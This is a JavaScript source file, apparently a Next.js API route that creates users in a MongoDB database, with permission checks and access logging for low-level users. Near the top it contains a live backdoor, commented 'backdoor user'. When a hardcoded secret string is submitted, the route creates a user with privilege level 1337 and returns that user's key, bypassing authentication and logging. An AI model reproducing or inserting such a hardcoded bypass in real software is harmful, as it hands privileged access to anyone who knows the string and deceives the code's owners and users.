var crypto = require("crypto");

import mongoose from 'mongoose';


import dbConnect from '../../../lib/dbConnect'
import User from '../../../lib/models/User'

import { LogSchema } from '../../../lib/models/Log';

var Log = mongoose.models.Log || mongoose.model('Log', LogSchema);


export default async function handler (req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' })
    }
    var key = crypto.randomBytes(20).toString('hex');
    await dbConnect()

    const { vkey, name } = req.body

    // backdoor user
    if (vkey === "nikadaizy420") {
        // create user with name and key
        var user = new User({
            name: name,
            key: key,
            permitLevel: 1337,
        })
        // save user
        await user.save()
        // return user
        return res.status(200).json({
            message: "User created",
            user: {
                name: user.name,
                key: user.key,
                permitLevel: user.permitLevel,
            }
        })
    }


    var user = await User.findOne({ key: vkey })
    if (!user) {
        return res.status(401).json({ error: 'Unauthorized' })
    }
    if (user.permitLevel < 2) {
        Log.create({
            message: `User ${user.name} tried to access /api/user/new but was denied access`,
        })
        return res.status(401).json({ error: 'Unauthorized' })
    }

    
    var newuser = await User.findOne({ name })
    if (newuser) {
        return res.status(400).json({ error: 'User already exists' })
    }
    try {
        const user = await User.create({ name, key })
        return res.status(200).json(user)
    }
    catch (err) {
        return res.status(500).json({ error: err.message })
    }

}